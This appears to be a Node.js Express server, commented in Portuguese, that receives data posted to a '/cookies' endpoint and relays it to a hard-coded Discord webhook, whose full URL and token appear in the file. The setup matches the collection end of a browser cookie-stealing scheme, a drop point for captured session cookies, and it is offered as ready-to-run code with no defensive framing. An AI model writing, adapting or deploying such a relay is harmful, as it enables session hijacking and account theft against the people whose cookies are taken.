const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
app.use(bodyParser.json());

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud'; // Substitua pelo URL do seu webhook do Discord

app.post('/cookies', (req, res) => {
    const cookies = req.body.cookies;
    
    // Envia os cookies para o webhook do Discord
    axios.post(WEBHOOK_URL, { content: cookies })
        .then(() => console.log('Cookies enviados para o Discord'))
        .catch((err) => console.error('Erro ao enviar cookies para o Discord:', err));

    res.sendStatus(200);
});

app.listen(3000, () => {
    console.log('Servidor rodando na porta 3000');
});
